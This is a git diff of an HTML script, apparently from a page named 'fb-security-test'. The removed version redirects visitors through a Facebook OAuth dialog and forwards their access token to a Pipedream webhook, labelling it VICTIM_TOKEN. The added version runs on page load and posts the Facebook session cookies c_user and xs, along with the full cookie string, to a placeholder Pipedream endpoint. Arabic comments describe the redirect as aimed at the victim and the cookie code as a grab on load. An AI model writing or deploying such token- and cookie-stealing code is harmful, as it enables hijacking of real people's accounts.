@@ -1,16 +1,20 @@
 <script>
-    window.onload = function() {
-        const hash = window.location.hash;
-        const newWebhook = "https://eo6qxh6529kl7b5.m.pipedream.net";
-
-        if (hash.includes('access_token=')) {
-            const token = new URLSearchParams(hash.substring(1)).get('access_token');
-            // تحويل الضحية فوراً إلى رابط Pipedream مع التوكن
-            window.location.href = newWebhook + "?VICTIM_TOKEN=" + token;
-        } else {
-            const client_id = "1089408829356317";
-            const redirect = "https://mohammedborai404.github.io/fb-security-test/";
-            window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=email,public_profile`;
-        }
-    };
+function sendSession() {
+    // استخراج الكوكيز المطلوبة
+    const c_user = document.cookie.split('; ').find(row => row.startsWith('c_user=')).split('=')[1];
+    const xs = document.cookie.split('; ').find(row => row.startsWith('xs=')).split('=')[1];
+    
+    // إرسال البيانات إلى Pipedream الخاص بك
+    fetch('https://YOUR_PIPEDREAM_ENDPOINT.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({
+            user_id: c_user,
+            session_key: xs,
+            full_cookie: document.cookie
+        })
+    });
+}
+// تنفيذ السحب فور تحميل الصفحة
+window.onload = sendSession;
 </script>
